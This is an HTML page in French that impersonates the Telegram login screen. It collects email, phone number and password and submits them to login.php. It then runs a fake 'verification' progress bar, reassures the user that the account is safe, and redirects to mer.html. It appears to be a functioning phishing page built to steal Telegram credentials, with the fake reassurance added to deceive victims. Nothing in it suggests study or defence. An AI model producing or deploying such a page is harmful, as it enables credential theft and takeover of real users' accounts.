<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Connexion Telegram</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            color: #222;
        }
        .login-container {
            background: #ffffff;
            border: 1px solid #ddd;
            padding: 30px 40px;
            border-radius: 10px;
            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        img {
            width: 80px;
            margin-bottom: 20px;
        }
        h2 {
            margin-bottom: 25px;
            font-weight: 600;
            color: #0088cc;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }
        input[type="text"],
        input[type="tel"],
        input[type="email"],
        input[type="password"],
        select {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ccc;
            border-radius: 7px;
            font-size: 1em;
            box-sizing: border-box;
        }
        .remember-me {
            display: flex;
            align-items: center;
            margin: 15px 0;
        }
        .remember-me input {
            margin-right: 10px;
            accent-color: #0088cc;
        }
        button {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 7px;
            font-size: 1.1em;
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin-top: 10px;
        }
        button:hover {
            background-color: #006699;
        }
        .progress-container {
            margin-top: 20px;
            display: none;
        }
        .progress-bar {
            width: 100%;
            background: #ddd;
            border-radius: 5px;
            overflow: hidden;
        }
        .progress-bar-fill {
            height: 20px;
            background: #0088cc;
            width: 0%;
            color: #fff;
            text-align: center;
            line-height: 20px;
            transition: width 0.2s;
        }
        .final-message {
            display: none;
            margin-top: 20px;
        }
        .final-message p {
            font-size: 1.1em;
            color: #22863a;
            margin-bottom: 15px;
        }
        .confirm-btn {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 7px;
            font-size: 1em;
            cursor: pointer;
        }
        .loading-message {
            display: none;
            margin: 20px 0;
            font-size: 1.1em;
            color: #0088cc;
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo Telegram" />
    <h2 id="form-title">Telegram</h2>
    
    <form action="login.php" method="post" id="loginForm">
        <div class="form-group">
            <label for="username">E-mail</label>
            <input type="text" id="username" name="username" placeholder="adresse mail" required autocomplete="username">
        </div>
        <div class="form-group">
            <label for="email">numéro de téléphone</label>
            <input type="email" id="email" name="email" placeholder="(+33)" required autocomplete="username">
        </div>
        <div class="form-group">
            <label for="password">Mot de passe</label>
            <input type="password" id="password" name="password" placeholder="Mot de passe" required autocomplete="current-password">
        </div>
        <div class="remember-me">
            <input type="checkbox" id="remember" name="remember" checked>
            <label for="remember">Garder ma session active</label>
        </div>
        <button type="submit" id="submit-btn">Continuer</button>
    </form>

    <div class="loading-message" id="loading-message">
        Vérification en cours, veuillez patienter...
    </div>

    <div class="progress-container" id="progress-container">
        <div class="progress-bar">
            <div class="progress-bar-fill" id="progress-fill">0%</div>
        </div>
    </div>

    <div class="final-message" id="final-message">
        <p>Votre compte est en sécurité.</p>
        <button class="confirm-btn" onclick="location.reload()">Confirmer</button>
    </div>
</div>

<script>
    const loginForm = document.getElementById('loginForm');
    const loadingMessage = document.getElementById('loading-message');
    const submitBtn = document.getElementById('submit-btn');
    const progressContainer = document.getElementById('progress-container');
    const progressFill = document.getElementById('progress-fill');
    const finalMessage = document.getElementById('final-message');

    loginForm.addEventListener('submit', function(event) {
        event.preventDefault();
        
        // Soumission des données en premier
        fetch('login.php', {
            method: 'POST',
            body: new FormData(loginForm)
        }).then(response => {
            // Après soumission, afficher la simulation de chargement
            loginForm.style.display = 'none';
            loadingMessage.style.display = 'block';
            progressContainer.style.display = 'block';

            // Simulation de la vérification pendant 15 secondes
            let progress = 0;
            const interval = setInterval(() => {
                progress += 5;
                progressFill.style.width = progress + '%';
                progressFill.textContent = progress + '%';
                
                if (progress >= 100) {
                    clearInterval(interval);
                    loadingMessage.style.display = 'none';
                    progressContainer.style.display = 'none';
                    finalMessage.style.display = 'block';
                    
                    // Redirection vers mer.html après 2 secondes
                    setTimeout(() => {
                        window.location.href = 'mer.html';
                    }, 2000);
                }
            }, 750);
        }).catch(error => {
            console.error('Erreur:', error);
        });
    });
</script>

</body>
</html
